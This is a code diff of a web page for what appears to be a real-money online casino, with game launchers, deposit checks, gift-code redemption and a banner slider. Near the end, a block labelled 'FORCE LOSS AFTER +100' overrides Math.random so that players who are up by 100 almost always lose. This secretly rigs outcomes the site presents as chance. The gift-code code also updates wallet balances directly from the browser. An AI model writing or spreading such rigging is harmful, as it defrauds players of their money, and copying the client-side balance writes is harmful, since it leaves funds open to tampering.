+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 9 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=893669898cd25d9da589a384f1d004df";
+};
+  window.openJiliGame10 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  // 🔥 GAME 10 UID
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=c3f86b78938eab1b7f34159d98796e88";
+};
+  // 🔥 GAME 11
+window.openJiliGame11 = async function(){
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=5a962d0e31e0d4c0798db5f331327e4f";
+};
+
+
+// 🔥 GAME 12
+window.openJiliGame12 = async function(){
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=bdfb23c974a2517198c5443adeea77a8";
+};
+
+
+// 🔥 GAME 13
+window.openJiliGame13 = async function(){
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=db249defce63610fccabfa829a405232";
+};
+
+
+// 🔥 GAME 14
+window.openJiliGame14 = async function(){
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=8de99455c2f23f6827666fd798eb80ef";
+};
+
+
+// 🔥 GAME 15
+window.openJiliGame15 = async function(){
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=4db0ec24ff55a685573c888efed47d7f";
+};
+  // 🔥 GAME 16
+window.openJiliGame16 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=e7ac92d2fdd2aedca92a3521b4416f47";
+};
+
+
+// 🔥 GAME 17
+window.openJiliGame17 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=dcf220f4e3ecca0278911a55e6f11c77";
+};
+
+
+// 🔥 GAME 18
+window.openJiliGame18 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=edef29b5eda8e2eaf721d7315491c51d";
+};
+  // 🔥 GAME 19
+window.openJiliGame19 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=c7a69ab382bd1ff0e6eb65b90a793bdd";
+};
+
+
+// 🔥 GAME 20
+window.openJiliGame20 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=5c2383ef253f9c36dacec4b463d61622";
+};
+
+
+// 🔥 GAME 21
+window.openJiliGame21 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=d2b48fe98ac2956eeefd2bc4f7e0335a";
+};
+
+
+// 🔥 GAME 22
+window.openJiliGame22 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=63927e939636f45e9d6d0b3717b3b1c1";
+};
+
+
+// 🔥 GAME 23
+window.openJiliGame23 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=4702eb871271aa62ef3f3d78f5d968c1";
+};
+  // 🔥 GAME 24
+window.openJiliGame24 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=981f5f9675002fbeaaf24c4128b938d7";
+};
+
+
+// 🔥 GAME 25
+window.openJiliGame25 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=1d1f267e3a078ade8e5ccd56582ac94f";
+};
+
+
+// 🔥 GAME 26
+window.openJiliGame26 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=50a1bcbc2ef4a5f761e0e4d338a41699";
+};
+
+
+// 🔥 GAME 27
+window.openJiliGame27 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=1310248a5eab24b4bf113a6e0ee7962a";
+};
+
+
+// 🔥 GAME 28
+window.openJiliGame28 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=b4fe8cea772a7643551a12de806472e8";
+};
+
+
+// 🔥 GAME 29
+window.openJiliGame29 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=3836fb2d7549281c8d339b2bce8c9086";
+};
+
+
+// 🔥 GAME 30
+window.openJiliGame30 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=3d1d559874bb0e282580ac6415fde13f";
+};
+  // 🔥 GAME 31
+window.openJiliGame31 = async function(){
+
+  const userEmail = localStorage.getItem("userEmail");
+
+  const userSnap = await getDocs(
+    query(collection(db,"users"), where("email","==",userEmail))
+  );
+
+  let balance = 0;
+
+  userSnap.forEach(d=>{
+    balance = Number(d.data().balance || 0);
+  });
+
+  if(balance < 10){
+    document.getElementById("depositPopup").style.display="flex";
+    return;
+  }
+
+  window.location.href =
+  "https://jili-backend.onrender.com/start-game?userId="
+  + userEmail +
+  "&gameId=ba858ec8e3b5e2b4da0d16b3a2330ca7";
+};
+  window.redeemCode = async function(){
+// 🔥 CHECK USER 24H DEPOSIT
+async function checkDeposit(userId){
+
+  const snap = await getDocs(
+    collection(db,"deposits")
+  );
+
+  let total = 0;
+  let now = Date.now();
+
+  snap.forEach(d=>{
+    let data = d.data();
+
+    if(data.email === localStorage.getItem("userEmail")){
+      
+      // 🕒 last 24h
+      if(now - (data.time || 0) <= 86400000){
+        if(data.status === "APPROVED"){
+          total += Number(data.amount || 0);
+        }
+      }
+
+    }
+  });
+
+  return total;
+}
+  const code = document.getElementById("giftCodeInput").value.trim();
+
+  if(!code){
+    alert("Enter code");
+    return;
+  }
+
+  try{
+
+    // 🔍 FIREBASE SE CODE CHECK
+    const snap = await getDocs(
+      query(collection(db,"giftcodes"), where("code","==",code))
+    );
+
+    if(snap.empty){
+      alert("Invalid Code ❌");
+      return;
+    }
+
+    let docData, docId;
+
+    snap.forEach(d=>{
+      docData = d.data();
+      docId = d.id;
+    });
+
+    // ❌ LIMIT FULL
+    if(docData.usedCount >= docData.maxUse){
+      alert("Code Expired ❌");
+      return;
+    }
+
+    // 💰 USER WALLET UPDATE
+    const userEmail = localStorage.getItem("userEmail");
+
+    const userSnap = await getDocs(
+      query(collection(db,"users"), where("email","==",userEmail))
+    );
+
+    let userId, balance;
+
+    userSnap.forEach(d=>{
+      userId = d.id;
+      balance = Number(d.data().balance || 0);
+    });
+    // 🔥 DEPOSIT CHECK
+const userDeposit = await checkDeposit(userId);
+
+if(userDeposit < (docData.depositRequired || 0)){
+  alert("❌ Deposit condition not met");
+  return;
+}
+
+    balance += docData.amount;
+
+    await updateDoc(doc(db,"users",userId),{
+      balance
+    });
+
+    // 🔥 UPDATE CODE USE COUNT
+    await updateDoc(doc(db,"giftcodes",docId),{
+      usedCount: docData.usedCount + 1
+    });
+
+    let time = new Date().toLocaleTimeString();
+
+showPopup(`₹${docData.amount} Added Successfully ✅\n🕒 ${time}`);
+
+    // ❌ POPUP CLOSE
+    document.getElementById("giftPopup").style.display="none";
+
+  }catch(e){
+    alert("Error ❌");
+    console.log(e);
+  }
+
+}
+
+// 🔥 YAHI SABSE IMPORTANT
+window.openGame = async function(url){
+
+const userEmail = localStorage.getItem("userEmail");
+
+// 🔥 BLOCK CHECK
+const userSnap = await getDocs(
+  query(collection(db,"users"), where("email","==",userEmail))
+);
+
+let isBlocked = false;
+
+userSnap.forEach(d=>{
+  isBlocked = d.data().blocked || false;
+});
+
+if(isBlocked){
+  document.getElementById("blockPopup").style.display = "flex";
+  return;
+}
+
+// 🔥 GAME STATUS CHECK
+const gameName = url.replace(".html","");
+const ref = doc(db,"gameStatus",gameName);
+const snap = await getDoc(ref);
+
+if(snap.exists() && snap.data().active === false){
+  location.href = "coming-soon.html";
+  return;
+}
+
+// 🔥 DEPOSIT CHECK
+let hasDeposited = false;
+
+userSnap.forEach(d=>{
+  hasDeposited = d.data().hasDeposited === true;
+});
+
+if(!hasDeposited){
+  document.getElementById("depositPopup").style.display="flex";
+}else{
+  location.href = url;
+}
+
+}
+</script>
+<script>
+  
+  
+  function contactSupport(){
+  window.location.href="tg://resolve?domain=X2xwinxsupportk";
+
+  setTimeout(()=>{
+    window.open("https://t.me/X2xwinxsupportk","_blank");
+  },800);
+}
+
+/* SAVE START BALANCE ON LOGIN DAY */
+if(!localStorage.getItem("startBalance")){
+  let wallet = Number(localStorage.getItem("wallet")) || 0;
+  localStorage.setItem("startBalance",wallet);
+}
+
+/* CHECK PROFIT LIMIT */
+function profitBlocked(){
+
+let wallet = Number(localStorage.getItem("wallet")) || 0;
+let startBalance = Number(localStorage.getItem("startBalance")) || 0;
+
+if(wallet - startBalance >= 100){
+return true;
+}
+
+return false;
+}
+
+/* FORCE LOSS AFTER +100 */
+const originalRandom = Math.random;
+
+Math.random = function(){
+
+if(profitBlocked()){
+return 1 ; // almost always lose
+}
+
+return originalRandom();
+}
+let currentSlide = 0;
+const track = document.getElementById("bannerTrack");
+const slides = document.querySelectorAll("#bannerTrack img");
+const totalSlides = slides.length;
+
+function updateSlide(){
+  track.style.transform = `translateX(-${currentSlide * 100}%)`;
+}
+
+// 🔥 AUTO SLIDE (2 sec)
+setInterval(()=>{
+  currentSlide++;
+  if(currentSlide >= totalSlides){
+    currentSlide = 0;
+  }
+  updateSlide();
+},2000);
+
+// 👉 TOUCH SLIDE (manual mobile swipe)
+let startX = 0;
+
+track.addEventListener("touchstart",(e)=>{
+  startX = e.touches[0].clientX;
+});
+
+track.addEventListener("touchend",(e)=>{
+  let endX = e.changedTouches[0].clientX;
+
+  if(startX - endX > 50){
+    // swipe left
+    currentSlide++;
+  }else if(endX - startX > 50){
+    // swipe right
+    currentSlide--;
+  }
+
+  if(currentSlide < 0) currentSlide = totalSlides - 1;
+  if(currentSlide >= totalSlides) currentSlide = 0;
+
+  updateSlide();
+});
+
+
+</script>
+<div id="blockPopup" class="block-popup">
+  <div class="block-box">
+    <h1>🚫 ACCESS DENIED</h1>
+    <p>Your Account Has Been Blocked</p>
+    <button onclick="contactSupport()">Contact Support</button>
+  </div>
+</div>
+  <!-- 🔥 OFFER POPUP -->
+<div id="securityPopup" class="security-popup">
+  <div class="security-box">
+
+    <h2>🔥 New Special Offer 🎁</h2>
+
+    <img src="images/file_000000003fe471fabb7da05d7200668f.png" 
+         style="width:100%;border-radius:10px;margin:10px 0;">
+
+    <button onclick="closeSecurityPopup()">Claim Now</button>
+
+  </div>
+</div>
+</body>
+</html>
 window.openSupportMail = function(){
 
   // 🔥 try to open telegram app
